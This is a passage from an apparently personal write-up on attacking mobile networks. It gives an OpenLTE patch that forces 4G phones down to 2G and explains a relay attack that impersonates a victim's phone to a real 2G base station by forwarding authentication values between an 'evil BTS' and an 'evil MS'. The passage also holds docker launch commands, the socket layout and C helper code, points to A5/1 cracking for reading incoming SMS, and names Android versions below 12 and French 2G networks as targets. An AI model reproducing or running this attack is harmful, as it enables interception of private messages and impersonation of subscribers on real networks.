<span id="cb5-122"><a href="#cb5-122" aria-hidden="true" tabindex="-1"></a>             }</span>
<span id="cb5-123"><a href="#cb5-123" aria-hidden="true" tabindex="-1"></a>         }else{</span>
<span id="cb5-124"><a href="#cb5-124" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1195,6 +1209,9 @@</span></span>
<span id="cb5-125"><a href="#cb5-125" aria-hidden="true" tabindex="-1"></a>         user-&gt;prepare_for_deletion();</span>
<span id="cb5-126"><a href="#cb5-126" aria-hidden="true" tabindex="-1"></a>         send_attach_reject(user, rb);</span>
<span id="cb5-127"><a href="#cb5-127" aria-hidden="true" tabindex="-1"></a>         break;</span>
<span id="cb5-128"><a href="#cb5-128" aria-hidden="true" tabindex="-1"></a><span class="va">+ case LTE_FDD_ENB_MME_STATE_TAU_REJECT:</span></span>
<span id="cb5-129"><a href="#cb5-129" aria-hidden="true" tabindex="-1"></a><span class="va">+        send_tracking_area_update_reject(user, rb);</span></span>
<span id="cb5-130"><a href="#cb5-130" aria-hidden="true" tabindex="-1"></a><span class="va">+break;</span></span>
<span id="cb5-131"><a href="#cb5-131" aria-hidden="true" tabindex="-1"></a>     case LTE_FDD_ENB_MME_STATE_AUTHENTICATE:</span>
<span id="cb5-132"><a href="#cb5-132" aria-hidden="true" tabindex="-1"></a>         send_authentication_request(user, rb);</span>
<span id="cb5-133"><a href="#cb5-133" aria-hidden="true" tabindex="-1"></a>         break;</span>
<span id="cb5-134"><a href="#cb5-134" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1397,6 +1414,52 @@</span></span>
<span id="cb5-135"><a href="#cb5-135" aria-hidden="true" tabindex="-1"></a>                       (LTE_FDD_ENB_MESSAGE_UNION *)&amp;cmd_ready,</span>
<span id="cb5-136"><a href="#cb5-136" aria-hidden="true" tabindex="-1"></a>                       sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));</span>
<span id="cb5-137"><a href="#cb5-137" aria-hidden="true" tabindex="-1"></a> }</span>
<span id="cb5-138"><a href="#cb5-138" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-139"><a href="#cb5-139" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-140"><a href="#cb5-140" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-141"><a href="#cb5-141" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-142"><a href="#cb5-142" aria-hidden="true" tabindex="-1"></a><span class="va">+void LTE_fdd_enb_mme::send_tracking_area_update_reject(LTE_fdd_enb_user *user,</span></span>
<span id="cb5-143"><a href="#cb5-143" aria-hidden="true" tabindex="-1"></a><span class="va">+                                         LTE_fdd_enb_rb   *rb)</span></span>
<span id="cb5-144"><a href="#cb5-144" aria-hidden="true" tabindex="-1"></a><span class="va">+{</span></span>
<span id="cb5-145"><a href="#cb5-145" aria-hidden="true" tabindex="-1"></a><span class="va">+    LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;</span></span>
<span id="cb5-146"><a href="#cb5-146" aria-hidden="true" tabindex="-1"></a><span class="va">+    LIBLTE_MME_TRACKING_AREA_UPDATE_REJECT_MSG_STRUCT      ta_update_rej;</span></span>
<span id="cb5-147"><a href="#cb5-147" aria-hidden="true" tabindex="-1"></a><span class="va">+    LIBLTE_BYTE_MSG_STRUCT                   msg;</span></span>
<span id="cb5-148"><a href="#cb5-148" aria-hidden="true" tabindex="-1"></a><span class="va">+     ta_update_rej.emm_cause = user-&gt;get_emm_cause();</span></span>
<span id="cb5-149"><a href="#cb5-149" aria-hidden="true" tabindex="-1"></a><span class="va">+     ta_update_rej.t3446_present = false;</span></span>
<span id="cb5-150"><a href="#cb5-150" aria-hidden="true" tabindex="-1"></a><span class="va">+     liblte_mme_pack_tracking_area_update_reject_msg(</span></span>
<span id="cb5-151"><a href="#cb5-151" aria-hidden="true" tabindex="-1"></a><span class="va">+     &amp;ta_update_rej,</span></span>
<span id="cb5-152"><a href="#cb5-152" aria-hidden="true" tabindex="-1"></a><span class="va">+     LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,</span></span>
<span id="cb5-153"><a href="#cb5-153" aria-hidden="true" tabindex="-1"></a><span class="va">+     user-&gt;get_auth_vec()-&gt;k_nas_int,</span></span>
<span id="cb5-154"><a href="#cb5-154" aria-hidden="true" tabindex="-1"></a><span class="va">+     user-&gt;get_auth_vec()-&gt;nas_count_dl,</span></span>
<span id="cb5-155"><a href="#cb5-155" aria-hidden="true" tabindex="-1"></a><span class="va">+     LIBLTE_SECURITY_DIRECTION_DOWNLINK,</span></span>
<span id="cb5-156"><a href="#cb5-156" aria-hidden="true" tabindex="-1"></a><span class="va">+     &amp;msg);</span></span>
<span id="cb5-157"><a href="#cb5-157" aria-hidden="true" tabindex="-1"></a><span class="va">+    // Queue the NAS message for RRC</span></span>
<span id="cb5-158"><a href="#cb5-158" aria-hidden="true" tabindex="-1"></a><span class="va">+    rb-&gt;queue_rrc_nas_msg(&amp;msg);</span></span>
<span id="cb5-159"><a href="#cb5-159" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-160"><a href="#cb5-160" aria-hidden="true" tabindex="-1"></a><span class="va">+    // Signal RRC for NAS message</span></span>
<span id="cb5-161"><a href="#cb5-161" aria-hidden="true" tabindex="-1"></a><span class="va">+    nas_msg_ready.user = user;</span></span>
<span id="cb5-162"><a href="#cb5-162" aria-hidden="true" tabindex="-1"></a><span class="va">+    nas_msg_ready.rb   = rb;</span></span>
<span id="cb5-163"><a href="#cb5-163" aria-hidden="true" tabindex="-1"></a><span class="va">+    msgq_to_rrc-&gt;send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,</span></span>
<span id="cb5-164"><a href="#cb5-164" aria-hidden="true" tabindex="-1"></a><span class="va">+                      LTE_FDD_ENB_DEST_LAYER_RRC,</span></span>
<span id="cb5-165"><a href="#cb5-165" aria-hidden="true" tabindex="-1"></a><span class="va">+                      (LTE_FDD_ENB_MESSAGE_UNION *)&amp;nas_msg_ready,</span></span>
<span id="cb5-166"><a href="#cb5-166" aria-hidden="true" tabindex="-1"></a><span class="va">+                      sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));</span></span>
<span id="cb5-167"><a href="#cb5-167" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-168"><a href="#cb5-168" aria-hidden="true" tabindex="-1"></a><span class="va">+    send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);</span></span>
<span id="cb5-169"><a href="#cb5-169" aria-hidden="true" tabindex="-1"></a><span class="va">+// Unpack the message</span></span>
<span id="cb5-170"><a href="#cb5-170" aria-hidden="true" tabindex="-1"></a><span class="va">+    liblte_mme_unpack_tracking_area_update_reject_msg(&amp;msg, &amp;ta_update_rej);</span></span>
<span id="cb5-171"><a href="#cb5-171" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-172"><a href="#cb5-172" aria-hidden="true" tabindex="-1"></a><span class="va">+    interface-&gt;send_ctrl_info_msg("user fully attached imsi=%s imei=%s",</span></span>
<span id="cb5-173"><a href="#cb5-173" aria-hidden="true" tabindex="-1"></a><span class="va">+                                  user-&gt;get_imsi_str().c_str(),</span></span>
<span id="cb5-174"><a href="#cb5-174" aria-hidden="true" tabindex="-1"></a><span class="va">+                                  user-&gt;get_imei_str().c_str());</span></span>
<span id="cb5-175"><a href="#cb5-175" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-176"><a href="#cb5-176" aria-hidden="true" tabindex="-1"></a><span class="va">+    rb-&gt;set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACHED);</span></span>
<span id="cb5-177"><a href="#cb5-177" aria-hidden="true" tabindex="-1"></a><span class="va">+}</span></span>
<span id="cb5-178"><a href="#cb5-178" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-179"><a href="#cb5-179" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-180"><a href="#cb5-180" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-181"><a href="#cb5-181" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-182"><a href="#cb5-182" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-183"><a href="#cb5-183" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-184"><a href="#cb5-184" aria-hidden="true" tabindex="-1"></a> void LTE_fdd_enb_mme::send_attach_reject(LTE_fdd_enb_user *user,</span>
<span id="cb5-185"><a href="#cb5-185" aria-hidden="true" tabindex="-1"></a>                                          LTE_fdd_enb_rb   *rb)</span>
<span id="cb5-186"><a href="#cb5-186" aria-hidden="true" tabindex="-1"></a> {</span>
<span id="cb5-187"><a href="#cb5-187" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1412,7 +1475,7 @@</span></span>
<span id="cb5-188"><a href="#cb5-188" aria-hidden="true" tabindex="-1"></a>         imsi_num = user-&gt;get_temp_id();</span>
<span id="cb5-189"><a href="#cb5-189" aria-hidden="true" tabindex="-1"></a>     }</span>
<span id="cb5-190"><a href="#cb5-190" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-191"><a href="#cb5-191" aria-hidden="true" tabindex="-1"></a><span class="st">-    attach_rej.emm_cause           = user-&gt;get_emm_cause();</span></span>
<span id="cb5-192"><a href="#cb5-192" aria-hidden="true" tabindex="-1"></a><span class="va">+    attach_rej.emm_cause           = 2;</span></span>
<span id="cb5-193"><a href="#cb5-193" aria-hidden="true" tabindex="-1"></a>     attach_rej.esm_msg_present     = false;</span>
<span id="cb5-194"><a href="#cb5-194" aria-hidden="true" tabindex="-1"></a>     attach_rej.t3446_value_present = false;</span>
<span id="cb5-195"><a href="#cb5-195" aria-hidden="true" tabindex="-1"></a>     liblte_mme_pack_attach_reject_msg(&amp;attach_rej, &amp;msg);</span>
<span id="cb5-196"><a href="#cb5-196" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-197"><a href="#cb5-197" aria-hidden="true" tabindex="-1"></a><span class="kw">--- openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc   2017-07-29 22:18:34.000000000 +0200</span></span>
<span id="cb5-198"><a href="#cb5-198" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc   2022-01-25 17:09:37.116388236 +0100</span></span>
<span id="cb5-199"><a href="#cb5-199" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -229,7 +229,7 @@</span></span>
<span id="cb5-200"><a href="#cb5-200" aria-hidden="true" tabindex="-1"></a>     try</span>
<span id="cb5-201"><a href="#cb5-201" aria-hidden="true" tabindex="-1"></a>     {</span>
<span id="cb5-202"><a href="#cb5-202" aria-hidden="true" tabindex="-1"></a>         // Setup the USRP</span>
<span id="cb5-203"><a href="#cb5-203" aria-hidden="true" tabindex="-1"></a><span class="st">-        if(devs[idx-1]["type"] == "x300")</span></span>
<span id="cb5-204"><a href="#cb5-204" aria-hidden="true" tabindex="-1"></a><span class="va">+        if(devs[idx-1]["type"] == "soapy")</span></span>
<span id="cb5-205"><a href="#cb5-205" aria-hidden="true" tabindex="-1"></a>         {</span>
<span id="cb5-206"><a href="#cb5-206" aria-hidden="true" tabindex="-1"></a>             devs[idx-1]["master_clock_rate"] = "184320000";</span>
<span id="cb5-207"><a href="#cb5-207" aria-hidden="true" tabindex="-1"></a>             master_clock_set                 = true;</span>
<span id="cb5-208"><a href="#cb5-208" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -252,7 +252,6 @@</span></span>
<span id="cb5-209"><a href="#cb5-209" aria-hidden="true" tabindex="-1"></a>             usrp-&gt;set_rx_freq((double)liblte_interface_ul_earfcn_to_frequency(ul_earfcn));</span>
<span id="cb5-210"><a href="#cb5-210" aria-hidden="true" tabindex="-1"></a>             usrp-&gt;set_tx_gain(tx_gain);</span>
<span id="cb5-211"><a href="#cb5-211" aria-hidden="true" tabindex="-1"></a>             usrp-&gt;set_rx_gain(rx_gain);</span>
<span id="cb5-212"><a href="#cb5-212" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
<span id="cb5-213"><a href="#cb5-213" aria-hidden="true" tabindex="-1"></a>             // Setup the TX and RX streams</span>
<span id="cb5-214"><a href="#cb5-214" aria-hidden="true" tabindex="-1"></a>             tx_stream  = usrp-&gt;get_tx_stream(stream_args);</span>
<span id="cb5-215"><a href="#cb5-215" aria-hidden="true" tabindex="-1"></a>             rx_stream  = usrp-&gt;get_rx_stream(stream_args);</span>
<span id="cb5-216"><a href="#cb5-216" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -822,7 +821,7 @@</span></span>
<span id="cb5-217"><a href="#cb5-217" aria-hidden="true" tabindex="-1"></a>         buffer_size = 1024;</span>
<span id="cb5-218"><a href="#cb5-218" aria-hidden="true" tabindex="-1"></a>     }</span>
<span id="cb5-219"><a href="#cb5-219" aria-hidden="true" tabindex="-1"></a>     status = bladerf_sync_config(bladerf,</span>
<span id="cb5-220"><a href="#cb5-220" aria-hidden="true" tabindex="-1"></a><span class="st">-                                 BLADERF_MODULE_TX,</span></span>
<span id="cb5-221"><a href="#cb5-221" aria-hidden="true" tabindex="-1"></a><span class="va">+                                BLADERF_TX_X1,</span></span>
<span id="cb5-222"><a href="#cb5-222" aria-hidden="true" tabindex="-1"></a>                                  BLADERF_FORMAT_SC16_Q11_META,</span>
<span id="cb5-223"><a href="#cb5-223" aria-hidden="true" tabindex="-1"></a>                                  BLADERF_NUM_BUFFERS,</span>
<span id="cb5-224"><a href="#cb5-224" aria-hidden="true" tabindex="-1"></a>                                  buffer_size,</span>
<span id="cb5-225"><a href="#cb5-225" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -842,7 +841,7 @@</span></span>
<span id="cb5-226"><a href="#cb5-226" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-227"><a href="#cb5-227" aria-hidden="true" tabindex="-1"></a>     // Setup sync RX</span>
<span id="cb5-228"><a href="#cb5-228" aria-hidden="true" tabindex="-1"></a>     status = bladerf_sync_config(bladerf,</span>
<span id="cb5-229"><a href="#cb5-229" aria-hidden="true" tabindex="-1"></a><span class="st">-                                 BLADERF_MODULE_RX,</span></span>
<span id="cb5-230"><a href="#cb5-230" aria-hidden="true" tabindex="-1"></a><span class="va">+                                BLADERF_RX_X1,</span></span>
<span id="cb5-231"><a href="#cb5-231" aria-hidden="true" tabindex="-1"></a>                                  BLADERF_FORMAT_SC16_Q11_META,</span>
<span id="cb5-232"><a href="#cb5-232" aria-hidden="true" tabindex="-1"></a>                                  BLADERF_NUM_BUFFERS,</span>
<span id="cb5-233"><a href="#cb5-233" aria-hidden="true" tabindex="-1"></a>                                  buffer_size,</span>
<span id="cb5-234"><a href="#cb5-234" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -974,7 +973,7 @@</span></span>
<span id="cb5-235"><a href="#cb5-235" aria-hidden="true" tabindex="-1"></a>     if(radio_params-&gt;init_needed)</span>
<span id="cb5-236"><a href="#cb5-236" aria-hidden="true" tabindex="-1"></a>     {</span>
<span id="cb5-237"><a href="#cb5-237" aria-hidden="true" tabindex="-1"></a>         // Assume RX_timestamp and TX_timestamp difference is 0</span>
<span id="cb5-238"><a href="#cb5-238" aria-hidden="true" tabindex="-1"></a><span class="st">-        bladerf_get_timestamp(bladerf, BLADERF_MODULE_RX, (uint64_t*)&amp;rx_ts);</span></span>
<span id="cb5-239"><a href="#cb5-239" aria-hidden="true" tabindex="-1"></a><span class="va">+        bladerf_get_timestamp(bladerf, BLADERF_RX, (uint64_t*)&amp;rx_ts);</span></span>
<span id="cb5-240"><a href="#cb5-240" aria-hidden="true" tabindex="-1"></a>         next_tx_ts            = rx_ts + radio_params-&gt;samp_rate; // 1 second to make sure everything is setup</span>
<span id="cb5-241"><a href="#cb5-241" aria-hidden="true" tabindex="-1"></a>         metadata_rx.flags     = 0;</span>
<span id="cb5-242"><a href="#cb5-242" aria-hidden="true" tabindex="-1"></a>         metadata_rx.timestamp = next_tx_ts - (radio_params-&gt;N_samps_per_subfr*2); // Retard RX by 2 subframes</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>This patch applied on the OpenLTE suite should do the trick.</p>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Redirection Attack</a></p>
<p>And it does !</p>
<p>Then what to do ? We know how to be a BTS in front of a MS and force the UE (User Equipement : 4G phone) to fallback into 2G.</p>
<p>Hey ! We gonna pretend that we are the MS in front of the BTS !</p>
</section>
<section id="hacking-2g-bts" class="level1">
<h1>Hacking 2G BTS</h1>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="test3.png"><img src="test3.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">Attack Flow</figcaption>
</figure>
</div>
<p>The UE has become an MS again and we know how to be a BTS !</p>
<p>But even in the BTS does not authenticate MS does in front of the BTS. How can we bypass this ? By respecting the attack flow above ;)</p>
<p>I mean the secret is the key Ki stored on the SIM even with physical access you can't crack it thanks to the chip inventor ! But we can fool the authentication process : The original process is :</p>
<ul>
<li>The BTS send a rand,key_sequence to the MS.</li>
<li>The MS respond SRes = f(ki,rand)</li>
<li>The MS cipher the communication with Kc= f(Ki,rand,key_seq)</li>
</ul>
<p>The hacked process is :</p>
<ul>
<li>The genuine BTS send a rand,key_seq to the Evil MS.</li>
<li>The Evil MS send it to our Evil BTS via socket between Evil BTS server and Evil MS client.</li>
<li>The Evil BTS send the rand,key_seq to genuine MS</li>
<li>The Genuine MS respond sres -&gt; Evil BTS -&gt; Evil MS -&gt; Genuine BTS</li>
<li>In the example video Kc is forwarded between Genuine MS-&gt; Evil MS</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Impersonnate PoC</a></p>
<p>With french explanations ;) sorry...</p>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Impersonalisaion (français)</a></p>
<p>With english explanation (now ;) <a href="https://www.youtube.com/watch?v=rSGA4oFsFrQ">Impersonate (english)</a></p>
<p><a href="https://imgur.com/lUjkpGp" class="uri">https://imgur.com/lUjkpGp</a> First of all there is a bug with brltty so</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> remove brltty</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>on host (not on docker !) Launch 1st</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> docker run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--user</span> root <span class="at">--cap-add</span> ALL  <span class="at">-v</span> /dev/bus/usb:/dev/bus/usb bastienbaranoff/ms-final:hell_yeah</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Launch 2nd</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> docker run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--user</span> root <span class="at">--cap-add</span> ALL  <span class="at">-v</span> /dev/bus/usb:/dev/bus/usb bastienbaranoff/bts-final:hell_yeah</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In this order cause need ip 172.17.0.2 for ms and 172.17.0.3 for bts (socket are made to work with theses addresses)</p>
<p>in bts</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">tmux</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">service</span> pcscd start</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./evil-bts.sh</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>` then in ms :</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">tmux</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> trx.sh</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ctrl-b</span> c </span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">./evil-ms.sh</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>set IMSI in OpenBSC (via telnet) and in /root/.osmocom/bb/mobile.cfg and set any ki but set one in OpenBSC need a motorola c1** and a sim reader</p>
<p>What happen next ?</p>
<p><a href="https://brmlab.cz/project/gsm/deka/attack-implementation">Crack A5/1</a></p>
<p>5s to crack it before the Kc ciphered channel timeout has been gone and if it is done we have incomming SMS.</p>
<p>Targets android &lt; 12, telco 2G until 2025 in France</p>
<p>Thank for reading !</p>
</section>
<section id="clients-servers-architecture" class="level1">
<h1>Clients-servers architecture :</h1>
<p>``` {.sourceCode .} bsc-2rfa 172.17.0.2 server rand 888 listen on 0.0.0.0 client sres 666 -&gt; 172.17.0.3</p>
<p>bb-2rfa 172.17.0.3 client rand 888 -&gt; 172.17.0.2 server sres 666 listen on 0.0.0.0 server kc 777 listen on 0.0.0.0</p>
<p>osmocom-genuine-ms 172.17.0.2 client kc 777 -&gt; 172.17.0.3</p>
<pre><code>
Headers :
=========

suppress\_space.h

``` {.sourceCode .c}
#include &lt;stdio.h&gt;
char res[100];
char* spaces(char str [])
{
int i = 0;int j = 0;
       while (str[i] != '\0')
       {
          if ((str[i] == ' ') != 1) {
            res[j] = str[i];
            j++;
          }
          i++;
       }
       res[j] = '\0';
return res;}</code></pre>
<p>hex.h</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Read hex strings and output as text.</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="co"> *</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * No checking of the characters is done, but the strings must have an even</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * length.</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="co"> *</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="co"> * $Id: hex2ascii.c,v 1.1 2009/09/19 23:56:49 grog Exp $</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">"suppress_space.h"</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> hexdigit <span class="op">(</span><span class="dt">char</span> c<span class="op">)</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> outc<span class="op">;</span></span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a>  outc <span class="op">=</span> c <span class="op">-</span><span class="ch">'0'</span><span class="op">;</span></span>
<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>outc <span class="op">&gt;</span> <span class="dv">9</span><span class="op">)</span>                                 <span class="co">/* A - F or a - f */</span></span>
<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>    outc <span class="op">-=</span> <span class="dv">7</span><span class="op">;</span>                                  <span class="co">/* A - F */</span></span>
<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>outc <span class="op">&gt;</span> <span class="dv">15</span><span class="op">)</span>                                <span class="co">/* a - f? */</span></span>
<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>    outc <span class="op">-=</span> <span class="dv">32</span><span class="op">;</span></span>
<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>outc <span class="op">&gt;</span> <span class="dv">15</span><span class="op">)</span> <span class="op">||</span> <span class="op">(</span>outc <span class="op">&lt;</span> <span class="dv">0</span><span class="op">))</span></span>
<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>    fprintf <span class="op">(</span>stderr<span class="op">,</span> <span class="st">"Invalid character </span><span class="sc">%c</span><span class="st">, aborting</span><span class="sc">\n</span><span class="st">"</span><span class="op">,</span> c<span class="op">);</span></span>
<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a>    exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> outc<span class="op">;</span></span>
<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> ascii<span class="op">[</span><span class="dv">17</span><span class="op">];</span></span>
<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a><span class="dt">const</span> <span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*</span> hex2ascii<span class="op">(</span><span class="dt">char</span> hexval<span class="op">[])</span></span>
<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a><span class="op">{</span>  <span class="dt">int</span> arg<span class="op">;</span></span>
<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>c<span class="op">=</span>spaces<span class="op">(</span>hexval<span class="op">);</span></span>
<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sl<span class="op">;</span></span>
<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> oc<span class="op">;</span></span>
<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span>arg <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> arg <span class="op">&lt;</span> <span class="dv">17</span><span class="op">;</span> arg<span class="op">++)</span></span>
<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a>    sl <span class="op">=</span> strlen <span class="op">(</span>c<span class="op">);</span></span>
<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>sl <span class="op">&amp;</span> <span class="dv">1</span><span class="op">)</span>                                 <span class="co">/* odd length */</span></span>
<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a>      fprintf <span class="op">(</span>stderr<span class="op">,</span></span>
<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a>               <span class="st">"</span><span class="sc">%s</span><span class="st"> is </span><span class="sc">%d</span><span class="st"> chars long, must be even</span><span class="sc">\n</span><span class="st">"</span><span class="op">,</span></span>
